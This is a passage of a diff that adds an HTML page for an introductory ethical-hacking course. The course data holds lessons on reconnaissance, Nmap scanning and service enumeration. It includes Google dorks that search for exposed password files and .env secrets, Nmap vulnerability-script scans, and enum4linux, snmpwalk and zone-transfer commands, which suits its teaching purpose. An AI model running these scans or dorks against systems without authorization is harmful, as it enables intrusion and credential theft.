@@ -1,0 +1,4030 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&family=Exo+2:wght@700;800;900&display=swap"
+      rel="stylesheet"
+    />
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css"
+    />
+    <link rel="stylesheet" href="assets/css/coursepages.css">
+    <!-- ========== Start: SEO & Schema Enhancement ========== -->
+    <title>Ethical Hacking Fundamentals Course | CipherHall</title>
+    <meta name="description" content="Begin your journey into cybersecurity with our hands-on Ethical Hacking Fundamentals course. Learn penetration testing, network scanning, and exploitation.">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon.png" />
+    <link rel="shortcut icon" href="/favicon.png" type="image/x-icon" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/favicon.png" />
+    <link rel="canonical" href="https://www.cipherhall.com/courses/ethical-hacking-fundamentals" />
+
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Course",
+      "name": "Ethical Hacking Fundamentals",
+      "description": "Learn the basics of cybersecurity, penetration testing, and ethical hacking tools. A beginner-friendly introduction to the world of offensive security.",
+      "provider": {
+        "@type": "Organization",
+        "name": "CipherHall",
+        "sameAs": "https://www.cipherhall.com"
+      },
+      "hasCourseInstance": {
+        "@type": "CourseInstance",
+        "courseMode": "Online",
+        "instructor": {
+          "@type": "Person",
+          "name": "Alex Vance"
+        }
+      }
+    }
+    </script>
+    <!-- ========== End: SEO & Schema Enhancement ========== -->
+</head>
+  <body>
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="loading-screen">
+      <div class="loader-icon">
+        <i class="fas fa-graduation-cap"></i>
+      </div>
+      <div class="loader-text">Loading Course Content...</div>
+    </div>
+
+    <!-- Sidebar Overlay for Mobile -->
+    <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+    <!-- Music Player (fixed at top right) -->
+    <div class="header-controls">
+      <div class="music-dropdown" id="music-dropdown">
+        <button class="btn btn-secondary">
+          <span id="music-button-text">STUDY MUSIC</span>
+          <i id="music-icon" class="fa-solid fa-music"></i>
+        </button>
+        <div class="music-dropdown-content" id="music-dropdown-content">
+          <a
+            href="#"
+            data-src="https://www.learningcontainer.com/wp-content/uploads/2020/02/Kalimba.mp3"
+            >1. Coffee Shop Vibes</a
+          >
+          <a
+            href="#"
+            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-16.mp3"
+            >2. City Lights Lofi</a
+          >
+          <a
+            href="#"
+            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-15.mp3"
+            >3. Mellow Thoughts</a
+          >
+          <a
+            href="#"
+            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-13.mp3"
+            >4. Rainy Mood</a
+          >
+          <a
+            href="#"
+            data-src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-10.mp3"
+            >5. Time Alone</a
+          >
+          <a href="#" id="stop-music-link"
+            ><i class="fa-solid fa-stop-circle"></i> Stop Music</a
+          >
+        </div>
+      </div>
+
+      <button class="btn btn-secondary" id="resetProgressBtn">
+        <i class="fas fa-redo"></i>
+        Reset Progress
+      </button>
+    </div>
+
+    <!-- Auth Modal -->
+    <div id="authModal" class="modal" style="display: none">
+      <div class="modal-overlay"></div>
+      <div class="modal-content">
+        <span class="close" id="closeAuthModal">&times;</span>
+        <div class="auth-tabs">
+          <button id="tabSignIn" class="auth-tab active">Sign In</button>
+          <button id="tabSignUp" class="auth-tab">Sign Up</button>
+        </div>
+        <div
+          id="authLoader"
+          style="display: none; text-align: center; padding: 2rem"
+        >
+          <i
+            class="fas fa-spinner fa-spin fa-2x"
+            style="color: var(--color-green)"
+          ></i>
+          <p style="margin-top: 0.5rem">Authenticating...</p>
+        </div>
+        <div id="signInForm" class="auth-form">
+          <h2>Sign In to CipherHall</h2>
+          <button id="googleSignIn" class="btn btn-google">
+            <i class="fab fa-google"></i> Continue with Google
+          </button>
+          <div class="divider"><span>or</span></div>
+          <form id="emailSignInForm">
+            <input
+              type="email"
+              id="signInEmail"
+              placeholder="Email Address"
+              required
+            />
+            <input
+              type="password"
+              id="signInPassword"
+              placeholder="Password"
+              required
+            />
+            <button type="submit" class="btn btn-primary">Sign In</button>
+          </form>
+        </div>
+        <div id="signUpForm" class="auth-form" style="display: none">
+          <h2>Join CipherHall</h2>
+          <button id="googleSignUp" class="btn btn-google">
+            <i class="fab fa-google"></i> Continue with Google
+          </button>
+          <div class="divider"><span>or</span></div>
+          <form id="emailSignUpForm">
+            <input
+              type="text"
+              id="signUpName"
+              placeholder="Full Name"
+              required
+            />
+            <input
+              type="email"
+              id="signUpEmail"
+              placeholder="Email Address"
+              required
+            />
+            <input
+              type="password"
+              id="signUpPassword"
+              placeholder="Password (min. 8 characters)"
+              required
+            />
+            <button type="submit" class="btn btn-secondary">
+              Create Account
+            </button>
+          </form>
+        </div>
+        <div id="authMessage"></div>
+      </div>
+    </div>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" id="sidebar">
+      <div class="sidebar-header">
+        <div class="course-info">
+          <h1 class="course-title" id="courseTitle">Loading...</h1>
+          <div class="course-progress">
+            <div class="progress-header">
+              <span class="progress-label">Course Progress</span>
+              <span class="progress-percentage" id="courseProgressPercent"
+                >0%</span
+              >
+            </div>
+            <div class="progress-bar">
+              <div
+                class="progress-fill"
+                id="courseProgressFill"
+                style="width: 0%"
+              ></div>
+            </div>
+            <div class="progress-stats">
+              <span id="completedLessons">0</span>
+              <span id="totalLessons">0</span>
+            </div>
+          </div>
+          <a href="/dashboard" class="back-to-dashboard">
+            <i class="fas fa-arrow-left"></i>
+            Back to Dashboard
+          </a>
+        </div>
+      </div>
+
+      <nav class="lesson-nav" id="lessonNav">
+        <!-- Lessons will be loaded dynamically -->
+      </nav>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="main-content">
+      <header class="content-header">
+        <div class="lesson-header">
+          <div class="lesson-header-left">
+            <span class="lesson-number" id="currentLessonNumber">1</span>
+            <h1 class="lesson-header-title" id="currentLessonTitle">
+              Loading...
+            </h1>
+          </div>
+          <div class="lesson-actions">
+            <button class="mbtn btn-primary" id="menuToggle">
+              <i class="fas fa-bars"></i>
+            </button>
+          </div>
+        </div>
+      </header>
+
+      <div class="content-body" id="contentBody">
+        <div class="lesson-content" id="lessonContent">
+          <!-- Lesson content will be loaded dynamically -->
+        </div>
+      </div>
+
+      <footer class="lesson-navigation">
+        <div class="nav-info" id="navInfo">Lesson 1 of 10</div>
+        <div class="nav-controls">
+          <button class="btn btn-secondary" id="prevLessonBtn" disabled>
+            <i class="fas fa-chevron-left"></i>
+            Previous
+          </button>
+          <button class="btn btn-primary" id="nextLessonBtn" disabled>
+            Next
+            <i class="fas fa-chevron-right"></i>
+          </button>
+        </div>
+      </footer>
+    </main>
+
+    <!-- Achievement Notification -->
+    <div id="achievementNotification" class="achievement-notification">
+      <div class="notification-header">
+        <div class="notification-icon" id="notificationIcon">
+          <i class="fas fa-trophy"></i>
+        </div>
+        <div class="notification-content">
+          <h3 id="notificationTitle">Achievement Unlocked!</h3>
+          <p id="notificationDescription">Description here...</p>
+        </div>
+      </div>
+      <div class="notification-reward" id="notificationReward">
+        <i class="fas fa-coins"></i>
+        <span id="notificationPoints">+100 Points</span>
+      </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toast" class="toast">
+      <span id="toastMessage"></span>
+    </div>
+
+    <script>
+      // =====================================================
+      // SYNCHRONIZED COURSE SYSTEM WITH DASHBOARD INTEGRATION
+      // =====================================================
+
+      // Supabase Configuration - Replace with your config
+      const supabaseUrl = "https://lzcmzulemfubjaksoqor.supabase.co";
+      const supabaseKey =
+        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx6Y216dWxlbWZ1Ympha3NvcW9yIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTUzMzM5MDgsImV4cCI6MjA3MDkwOTkwOH0.crhPH4YWtRsr1BJTpAQcmPbWSpwIWRbzoI4sRb2_fPI";
+      const supabase = window.supabase.createClient(supabaseUrl, supabaseKey);
+
+      // =====================================================
+      // COURSE DATA STRUCTURE - REPLACE WITH YOUR COURSE JSON
+      // =====================================================
+      const COURSE_DATA = {
+        id: "ethical-hacking-fundamentals",
+        title: "Ethical Hacking Fundamentals",
+        description:
+          "Learn the basics of cybersecurity, penetration testing, and ethical hacking tools.",
+        category: "cybersecurity",
+        difficulty: "Beginner",
+        duration: "40 hours",
+        instructor: "Dr. Evelyn Reed",
+        lessons: [
+          {
+            id: "lesson-1",
+            title: "Introduction to Ethical Hacking",
+            duration: "60 min",
+            objectives: [
+              "Understand the roles and responsibilities of an ethical hacker",
+              "Differentiate between white hat, black hat, and grey hat hackers",
+              "Learn the core phases of a penetration test",
+              "Recognize the legal and ethical boundaries of ethical hacking",
+            ],
+            content: {
+              overview:
+                "This foundational lesson introduces the world of ethical hacking. You'll learn what it means to be an ethical hacker, the different types of hackers, and the legal framework that governs penetration testing.",
+              sections: [
+                {
+                  title: "Roles, Responsibilities, and Legality",
+                  content:
+                    '<p>Ethical hacking, or penetration testing, is the practice of testing computer systems, networks, or web applications to find security vulnerabilities that a malicious attacker could exploit.</p><h3>Key Responsibilities:</h3><ul><li>Identify security flaws and vulnerabilities.</li><li>Document findings and provide remediation advice.</li><li>Operate within a strict code of ethics and legal agreements.</li><li>Maintain confidentiality of client information.</li></ul><div class="info-box warning"><div class="info-box-header"><i class="fas fa-exclamation-triangle"></i><strong>Legal is Paramount</strong></div><p>Ethical hacking is only legal with explicit, written permission from the target organization. Unauthorized hacking is a serious crime. The primary difference between an ethical hacker and a criminal is permission.</p></div>',
+                  image:
+                    "https://images.unsplash.com/photo-1563206767-5b18f218e8de?w=800&h=400&fit=crop",
+                },
+                {
+                  title: "Types of Hackers",
+                  content:
+                    "<p>Hackers are typically categorized by their motives and ethics, often referred to by 'hat' colors:</p><ul><li><strong>White Hat:</strong> The 'good guys'. Ethical hackers who have permission to test systems and improve security.</li><li><strong>Black Hat:</strong> The 'bad guys'. Malicious actors who hack for personal gain, espionage, or destruction.</li><li><strong>Grey Hat:</strong> A blend of both. They may hack without permission but often disclose vulnerabilities to the company, sometimes for a fee. Their actions are legally ambiguous.</li></ul>",
+                  image:
+                    "https://images.unsplash.com/photo-1544890225-2f3faec4446f?w=800&h=400&fit=crop",
+                },
+                {
+                  title: "Phases of a Penetration Test",
+                  content:
+                    "<p>A professional penetration test follows a structured process to ensure thoroughness and repeatability:</p><ol><li><strong>Planning & Reconnaissance:</strong> Defining scope and goals, and gathering intelligence.</li><li><strong>Scanning:</strong> Using tools to understand how the target responds to intrusions.</li><li><strong>Gaining Access (Exploitation):</strong> Exploiting vulnerabilities to gain entry.</li><li><strong>Maintaining Access:</strong> Ensuring persistent access to see the potential for long-term impact.</li><li><strong>Analysis & Reporting:</strong> Analyzing findings and compiling a report with remediation recommendations.</li></ol>",
+                },
+              ],
+              codeExamples: [],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "What is the single most important factor that separates ethical from malicious hacking?",
+                  options: [
+                    "The tools used",
+                    "The level of skill",
+                    "Written permission",
+                    "The time of day",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Explicit, written permission is the key legal and ethical differentiator. Without it, any form of hacking is illegal.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "A hacker finds a vulnerability on a company's website without permission and then asks for a fee to fix it. What type of hacker is this?",
+                  options: ["White Hat", "Black Hat", "Grey Hat", "Blue Hat"],
+                  correct: 2,
+                  explanation:
+                    "This is a classic example of a Grey Hat hacker, who operates in a legally and ethically ambiguous area without prior permission.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "What is the first phase of a professional penetration test?",
+                  options: [
+                    "Exploitation",
+                    "Scanning",
+                    "Reporting",
+                    "Planning & Reconnaissance",
+                  ],
+                  correct: 3,
+                  explanation:
+                    "The first phase is always Planning & Reconnaissance, where the scope is defined and initial information is gathered about the target.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-2",
+            title: "Cybersecurity Fundamentals",
+            duration: "60 min",
+            objectives: [
+              "Understand the CIA Triad (Confidentiality, Integrity, Availability)",
+              "Identify common attack vectors and types",
+              "Gain an overview of the modern threat landscape",
+            ],
+            content: {
+              overview:
+                "Before you can protect a system, you must understand the core principles of security. This lesson covers the foundational concepts of cybersecurity, including the CIA Triad and the types of threats organizations face.",
+              sections: [
+                {
+                  title: "The CIA Triad",
+                  content:
+                    "<p>The CIA Triad is a model designed to guide policies for information security within an organization.</p><ul><li><strong>Confidentiality:</strong> Ensuring that data is accessible only to authorized individuals. Think encryption and access controls.</li><li><strong>Integrity:</strong> Maintaining the consistency, accuracy, and trustworthiness of data. This involves preventing unauthorized modification. Think hashing and file permissions.</li><li><strong>Availability:</strong> Ensuring that information is available when needed to authorized users. Think redundancy, backups, and DDoS protection.</li></ul>",
+                  image:
+                    "https://images.unsplash.com/photo-1526374965328-5f61d4dc16c6?w=800&h=400&fit=crop",
+                },
+                {
+                  title: "Common Attack Types",
+                  content:
+                    "<p>Understanding the categories of attacks is crucial for defense and testing.</p><ul><li><strong>Malware:</strong> Malicious software including viruses, worms, ransomware, and spyware.</li><li><strong>Phishing:</strong> Fraudulent attempts to obtain sensitive information by disguising as a trustworthy entity.</li><li><strong>Man-in-the-Middle (MITM):</strong> Attackers intercept and relay communication between two parties.</li><li><strong>Denial-of-Service (DoS):</strong> Flooding a system with traffic to make it unavailable to legitimate users.</li><li><strong>SQL Injection:</strong> Injecting malicious SQL code into a query to manipulate a database.</li></ul>",
+                },
+                {
+                  title: "The Modern Threat Landscape",
+                  content:
+                    "<p>The landscape of cyber threats is constantly evolving.</p><h3>Key Trends:</h3><ul><li><strong>Ransomware-as-a-Service (RaaS):</strong> Makes it easy for less-skilled actors to launch ransomware attacks.</li><li><strong>AI-Powered Attacks:</strong> Using AI for more convincing phishing emails and to find vulnerabilities faster.</li><li><strong>IoT Vulnerabilities:</strong> The proliferation of insecure Internet of Things (IoT) devices creates new entry points.</li><li><strong>Supply Chain Attacks:</strong> Compromising a trusted software vendor to distribute malware to their customers.</li></ul>",
+                },
+              ],
+              codeExamples: [],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "Encrypting data to prevent unauthorized access primarily addresses which part of the CIA Triad?",
+                  options: [
+                    "Confidentiality",
+                    "Integrity",
+                    "Availability",
+                    "Authorization",
+                  ],
+                  correct: 0,
+                  explanation:
+                    "Confidentiality is about keeping data secret and ensuring it is only seen by authorized parties, which is the primary goal of encryption.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "A DDoS attack, which aims to make a website inaccessible, targets which principle of the CIA Triad?",
+                  options: [
+                    "Confidentiality",
+                    "Integrity",
+                    "Availability",
+                    "Authentication",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Denial-of-Service attacks directly target the availability of a service, aiming to make it unusable for legitimate users.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "An attacker who intercepts and alters a message between two people is performing what type of attack?",
+                  options: ["Phishing", "Malware", "Man-in-the-Middle", "DoS"],
+                  correct: 2,
+                  explanation:
+                    "A Man-in-the-Middle (MITM) attack involves positioning oneself between two communicating parties to eavesdrop or modify traffic.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-3",
+            title: "Information Gathering (Reconnaissance)",
+            duration: "75 min",
+            objectives: [
+              "Distinguish between passive and active reconnaissance",
+              "Understand the concept of Open Source Intelligence (OSINT)",
+              "Learn key techniques for gathering information without alerting the target",
+            ],
+            content: {
+              overview:
+                "Reconnaissance is the most critical and time-consuming phase of a hack. It involves gathering as much information as possible about a target to identify potential weaknesses. This lesson covers the core methods of information gathering.",
+              sections: [
+                {
+                  title: "Passive vs. Active Reconnaissance",
+                  content:
+                    '<h3>Passive Reconnaissance:</h3><p>Gathering information without directly interacting with the target\'s systems. This is stealthy and difficult to detect.</p><ul><li>Searching public records (e.g., WHOIS).</li><li>Using search engines (Google Dorking).</li><li>Browsing social media and job postings.</li><li>Analyzing publicly available financial reports.</li></ul><h3>Active Reconnaissance:</h3><p>Directly interacting with the target\'s systems to gather information. This is more effective but also noisier and can be detected by security systems.</p><ul><li>Port scanning.</li><li>Network mapping.</li><li>Vulnerability scanning.</li></ul><div class="info-box tip"><div class="info-box-header"><i class="fas fa-lightbulb"></i><strong>Start Passively</strong></div><p>Professional penetration testers always begin with passive reconnaissance to build a profile of the target without raising any alarms.</p></div>',
+                },
+                {
+                  title: "Open Source Intelligence (OSINT)",
+                  content:
+                    "<p>OSINT is the practice of collecting information from published or otherwise publicly available sources. It is the cornerstone of passive reconnaissance.</p><h3>Common OSINT Sources:</h3><ul><li><strong>Search Engines:</strong> Google, Bing, DuckDuckGo. Advanced search operators (Google Dorks) are essential.</li><li><strong>Social Media:</strong> LinkedIn, Twitter, Facebook can reveal employee names, roles, technologies used, and company culture.</li><li><strong>Public Registries:</strong> WHOIS for domain info, SEC filings for public companies.</li><li><strong>Specialized Search Engines:</strong> Shodan (for IoT/industrial controls), Censys.</li></ul>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Google Dorking Examples",
+                  language: "text",
+                  code: '# Find login pages on a specific site\nsite:example.com inurl:login\n\n# Find spreadsheets containing passwords\nsite:example.com filetype:xls intext:password\n\n# Find directory listings\nsite:example.com intitle:"index of"\n\n# Find exposed configuration files\nfiletype:env "DB_PASSWORD"',
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "Which of the following activities is an example of ACTIVE reconnaissance?",
+                  options: [
+                    "Searching for a company on LinkedIn",
+                    "Running a port scan with Nmap",
+                    "Reading a company's annual report",
+                    "Performing a WHOIS lookup",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Running a port scan directly interacts with and probes the target's servers, making it an active form of reconnaissance.",
+                },
+                {
+                  id: 2,
+                  question: "What does OSINT stand for?",
+                  options: [
+                    "Official System Intelligence",
+                    "Open Source Intelligence",
+                    "Operational Security Information",
+                    "Online Systems Integration",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "OSINT stands for Open Source Intelligence and refers to gathering information from publicly available sources.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "What is the primary advantage of passive reconnaissance?",
+                  options: [
+                    "It is faster than active recon",
+                    "It provides more accurate information",
+                    "It is stealthy and unlikely to be detected",
+                    "It directly identifies vulnerabilities",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "The main benefit of passive reconnaissance is that it does not involve direct interaction with the target, making it very difficult for the target to detect your activities.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-4",
+            title: "Footprinting Tools",
+            duration: "90 min",
+            objectives: [
+              "Use 'whois' and 'nslookup' for domain and IP intelligence",
+              "Understand how to use Shodan to find exposed devices",
+              "Get an introduction to the capabilities of Maltego for link analysis",
+            ],
+            content: {
+              overview:
+                "This lesson moves from theory to practice, introducing the first set of tools in a hacker's toolkit. You'll learn how to use command-line and web-based tools to perform footprinting—the process of creating a map of a target's network and systems.",
+              sections: [
+                {
+                  title: "Domain and DNS Intelligence: whois & nslookup",
+                  content:
+                    "<h3>whois</h3><p>A query and response protocol used for querying databases that store the registered users or assignees of an internet resource, such as a domain name or an IP address block.</p><h3>nslookup</h3><p>A network administration command-line tool for querying the Domain Name System (DNS) to obtain domain name or IP address mapping, or for any other specific DNS record.</p>",
+                  image:
+                    "https://images.unsplash.com/photo-1554497342-99f52f36b6a1?w=800&h=400&fit=crop",
+                },
+                {
+                  title: "Finding Exposed Devices: Shodan",
+                  content:
+                    '<p>Shodan is a search engine for Internet-connected devices. While Google indexes the web, Shodan indexes devices like webcams, routers, servers, industrial control systems (ICS), and more. It is an incredibly powerful tool for finding misconfigured and exposed systems.</p><h3>Example Shodan Filters:</h3><ul><li><code>port:22</code> - Find devices with the SSH port open.</li><li><code>org:"Tesla"</code> - Find devices owned by a specific organization.</li><li><code>country:"RU"</code> - Filter by country.</li><li><code>webcam</code> - Find exposed webcams.</li></ul>',
+                },
+                {
+                  title: "Visual Link Analysis: Maltego",
+                  content:
+                    "<p>Maltego is an OSINT and graphical link analysis tool. It takes information from public sources and visualizes it in a graph format, showing relationships between pieces of data like domain names, IP addresses, people, and email addresses. It is excellent for discovering hidden connections and infrastructure.</p>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "whois and nslookup Commands",
+                  language: "bash",
+                  code: "# Perform a WHOIS lookup on a domain\nwhois google.com\n\n# Find the IP address for a domain\nnslookup google.com\n\n# Find the mail exchange (MX) records for a domain\nnslookup -query=mx google.com\n\n# Attempt a DNS zone transfer (often fails, but important to try)\ndig axfr @ns1.google.com google.com",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "Which tool would you use to find the registration details of a domain name, such as the owner and contact email?",
+                  options: ["nslookup", "ping", "whois", "netstat"],
+                  correct: 2,
+                  explanation:
+                    "The 'whois' protocol is specifically designed to query databases for domain name and IP address registration information.",
+                },
+                {
+                  id: 2,
+                  question: "What is Shodan primarily used for?",
+                  options: [
+                    "Searching for websites",
+                    "Finding and indexing Internet-connected devices",
+                    "Analyzing social media relationships",
+                    "Cracking passwords",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "Shodan is a specialized search engine for finding devices connected to the internet, from servers and routers to IoT devices.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "Which tool is best suited for visualizing the relationships between different pieces of gathered intelligence?",
+                  options: ["Nmap", "Wireshark", "Maltego", "Metasploit"],
+                  correct: 2,
+                  explanation:
+                    "Maltego is a graphical link analysis tool designed to visualize connections and relationships between OSINT data points.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-5",
+            title: "Scanning Networks",
+            duration: "90 min",
+            objectives: [
+              "Understand the principles of network and port scanning",
+              "Learn to use Nmap for network discovery",
+              "Differentiate between various scan types (TCP, SYN, UDP)",
+            ],
+            content: {
+              overview:
+                "Scanning is a form of active reconnaissance where we probe the target's systems to discover live hosts, open ports, and running services. This lesson focuses on Nmap, the world's most popular and powerful network scanning tool.",
+              sections: [
+                {
+                  title: "Introduction to Nmap",
+                  content:
+                    "<p>Nmap (Network Mapper) is a free and open-source utility for network discovery and security auditing. It can discover live hosts on a network, identify open ports on those hosts, detect the services (and their versions) running on those ports, and infer the operating system of the target.</p>",
+                },
+                {
+                  title: "Port Scanning Techniques",
+                  content:
+                    '<p>Nmap offers many different scanning techniques:</p><ul><li><strong>TCP Connect Scan (<code>-sT</code>):</strong> Completes the full three-way TCP handshake. It\'s reliable but easily logged and detected.</li><li><strong>SYN Stealth Scan (<code>-sS</code>):</strong> A half-open scan. Nmap sends a SYN packet and waits for a SYN/ACK. If received, the port is open, and Nmap tears down the connection before it is completed. This is the default and most popular scan because it\'s stealthier.</li><li><strong>UDP Scan (<code>-sU</code>):</strong> Scans for open UDP ports. It is much slower than TCP scans.</li><li><strong>Version Detection (<code>-sV</code>):</strong> Probes open ports to determine the exact service and version running.</li><li><strong>OS Detection (<code>-O</code>):</strong> Attempts to determine the operating system of the target host.</li></ul><div class="info-box tip"><div class="info-box-header"><i class="fas fa-lightbulb"></i><strong>The Power of Scripts</strong></div><p>Nmap\'s power can be extended with the Nmap Scripting Engine (NSE). Use <code>--script=vuln</code> to scan for known vulnerabilities.</p></div>',
+                  image:
+                    "https://images.unsplash.com/photo-1593435713588-e99f2420955d?w=800&h=400&fit=crop",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Common Nmap Commands",
+                  language: "bash",
+                  code: "# Ping scan to discover live hosts on a network (no port scan)\nnmap -sn 192.168.1.0/24\n\n# Default (SYN stealth) scan on a single target\nsudo nmap -sS 192.168.1.101\n\n# Scan the top 1000 ports with service version and OS detection\nsudo nmap -sV -O 192.168.1.101\n\n# An aggressive, comprehensive scan (sC for default scripts, A for aggressive)\nsudo nmap -A -T4 192.168.1.101\n\n# Scan a specific port (e.g., port 80)\nnmap -p 80 192.168.1.101\n\n# Scan for common web vulnerabilities\nsudo nmap -p 80,443 --script=http-vuln* 192.168.1.101",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question:
+                    "What is the default and most popular scan type in Nmap, known for being 'stealthy'?",
+                  options: [
+                    "TCP Connect Scan (-sT)",
+                    "SYN Stealth Scan (-sS)",
+                    "UDP Scan (-sU)",
+                    "Ping Scan (-sn)",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "The SYN Stealth Scan (-sS) is the default for privileged users because it is faster and stealthier than a full TCP connect scan.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "You want to find out the specific version of Apache running on a web server. Which Nmap flag should you use?",
+                  options: ["-O", "-sn", "-sP", "-sV"],
+                  correct: 3,
+                  explanation:
+                    "The '-sV' flag enables version detection, which probes open ports to determine details about the service running on them.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "What is the purpose of the Nmap Scripting Engine (NSE)?",
+                  options: [
+                    "To make Nmap run faster",
+                    "To extend Nmap's functionality with custom scripts",
+                    "To hide the source of the scan",
+                    "To scan for UDP ports only",
+                  ],
+                  correct: 1,
+                  explanation:
+                    "The NSE allows users to write (or use pre-written) scripts to automate a wide variety of networking tasks, from advanced discovery to vulnerability detection.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-6",
+            title: "Enumeration",
+            duration: "75 min",
+            objectives: [
+              "Understand the goal of enumeration",
+              "Learn to enumerate SMB and NFS services",
+              "Learn to enumerate DNS and SNMP services",
+            ],
+            content: {
+              overview:
+                "Enumeration is the process of extracting detailed information from a target system after scanning has identified open ports and services. This phase aims to find user names, network shares, machine names, and other specific data that can be used for exploitation.",
+              sections: [
+                {
+                  title: "What is Enumeration?",
+                  content:
+                    "<p>Where scanning tells you a door is unlocked, enumeration is about peeking through the keyhole to see what's inside. It's an active, intrusive process of querying services on the target to get as much information as possible.</p><h3>Information Gathered during Enumeration:</h3><ul><li>User and group names</li><li>Hostnames and network shares</li><li>Service settings and configurations</li><li>Running applications and banners</li></ul>",
+                },
+                {
+                  title: "Enumerating Common Services",
+                  content:
+                    "<ul><li><strong>SMB (Server Message Block):</strong> Used for file sharing on Windows networks. Enumeration can reveal usernames, shared folders (shares), and system information. Tools like <code>enum4linux</code> are excellent for this.</li><li><strong>SNMP (Simple Network Management Protocol):</strong> Used for managing network devices. If misconfigured (e.g., using default 'community strings' like 'public' and 'private'), it can leak a vast amount of information about the network, devices, and users. Tools like <code>snmpwalk</code> are used.</li><li><strong>DNS (Domain Name System):</strong> Enumeration can involve attempting a zone transfer, which, if successful, copies all DNS records for a domain, revealing internal hosts and IP addresses.</li></ul>",
+                },
+              ],
+              codeExamples: [
+                {
+                  title: "Enumeration Commands",
+                  language: "bash",
+                  code: "# Enumerate a Windows host for shares, users, and more\nenum4linux -a <target_ip>\n\n# Walk an SNMP agent with the 'public' community string\nsnmpwalk -c public -v1 <target_ip>\n\n# Attempt a DNS zone transfer using dig\ndig axfr @<dns_server> <domain_name>",
+                },
+              ],
+            },
+            quiz: {
+              passingScore: 80,
+              questions: [
+                {
+                  id: 1,
+                  question: "Enumeration is best described as:",
+                  options: [
+                    "Discovering live hosts on a network",
+                    "Finding open ports on a host",
+                    "Actively extracting detailed information from services",
+                    "Disabling a service to test availability",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "Enumeration goes beyond scanning by actively connecting to services to extract detailed information like usernames, shares, and configurations.",
+                },
+                {
+                  id: 2,
+                  question:
+                    "The tool 'enum4linux' is primarily used to enumerate which service?",
+                  options: ["DNS", "HTTP", "SNMP", "SMB"],
+                  correct: 3,
+                  explanation:
+                    "'enum4linux' is a powerful tool specifically designed to enumerate SMB services, common in Windows environments.",
+                },
+                {
+                  id: 3,
+                  question:
+                    "A successful DNS zone transfer is a high-impact finding because it can reveal...",
+                  options: [
+                    "User passwords",
+                    "The target's operating system",
+                    "A complete list of internal hostnames and IP addresses",
+                    "The version of the web server",
+                  ],
+                  correct: 2,
+                  explanation:
+                    "A DNS zone transfer essentially hands you the target's address book, mapping out their internal network structure.",
+                },
+              ],
+            },
+          },
+          {
+            id: "lesson-7",
+            title: "Vulnerability Assessment",
+            duration: "75 min",
+            objectives: [
+              "Understand the purpose of vulnerability scanning",
+              "Learn about automated scanning tools like Nessus and OpenVAS",
+              "Recognize the importance of validating scan results",
+            ],
+            content: {
+              overview:
+                "Vulnerability assessment is the process of using automated tools to identify, classify, and prioritize vulnerabilities in computer systems. This lesson introduces the concept and the powerful tools that perform these scans.",
+              sections: [
+                {
+                  title: "The Role of Vulnerability Scanners",
+                  content:
